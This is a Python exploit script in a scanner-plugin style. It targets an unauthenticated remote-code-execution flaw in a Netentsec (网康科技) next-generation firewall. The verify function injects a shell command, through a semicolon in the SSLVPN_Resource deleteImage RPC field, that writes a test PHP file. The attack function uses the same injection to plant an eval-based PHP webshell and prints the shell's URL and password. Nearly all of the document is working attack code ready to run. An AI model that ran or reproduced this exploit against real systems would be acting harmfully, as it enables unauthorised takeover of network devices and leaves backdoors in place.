import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '网康科技-下一代防火墙前台 RCE(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://www.jianshu.com/p/88a69b3b17b6',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<?php echo "{randstr1}"."{randstr2}"; ?>'
    filename = 'test.php'
    payload = '/directdata/direct/router'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Cookie': 'PHPSESSID=e3ctlj1s8b5oblktckrk4anjh7; ys-active_page=s%3A',
    }
    vurl = urllib.parse.urljoin(url, payload)
    payload_json = {
        "action": "SSLVPN_Resource",
        "method": "deleteImage",
        "data": [{
            "data": [f"/var/www/html/b.txt;echo '{shell}'>/var/www/html/{filename}"]
        }],
        "type": "rpc",
        "tid": 17
    }
    verify_url = urllib.parse.urljoin(url, filename)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, json=payload_json, verify=False)
        if rep.status_code == 200 and re.search('SSLVPN_Resource', rep.text):

            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '''<?php eval($_POST[1]); ?>'''
    filename = 'test.php'
    payload = '/directdata/direct/router'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Cookie': 'PHPSESSID=e3ctlj1s8b5oblktckrk4anjh7; ys-active_page=s%3A',
    }
    vurl = urllib.parse.urljoin(url, payload)
    payload_json = {
        "action": "SSLVPN_Resource",
        "method": "deleteImage",
        "data": [{
            "data": [f"/var/www/html/b.txt;echo '{shell}'>/var/www/html/{filename}"]
        }],
        "type": "rpc",
        "tid": 17
    }
    verify_url = urllib.parse.urljoin(url, filename)
    print('[+] Exploit loading ......')
    time.sleep(3)
    try:
        print('[+] 尝试上传蚁剑webshell')
        rep = requests.post(vurl, headers=headers, timeout=timeout, json=payload_json, verify=False)
        if rep.status_code == 200 and re.search('SSLVPN_Resource', rep.text):
            print('[+] 上传完成，正在检测是否上传成功？')
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print('[*] webshell status: 200, 上传成功!')
                print('[*] webshell: ', verify_url)
                print('[*] 密码: 1',)
                return True
        return False
    except:
        print('[-] error or timeout > ', timeout)
        return False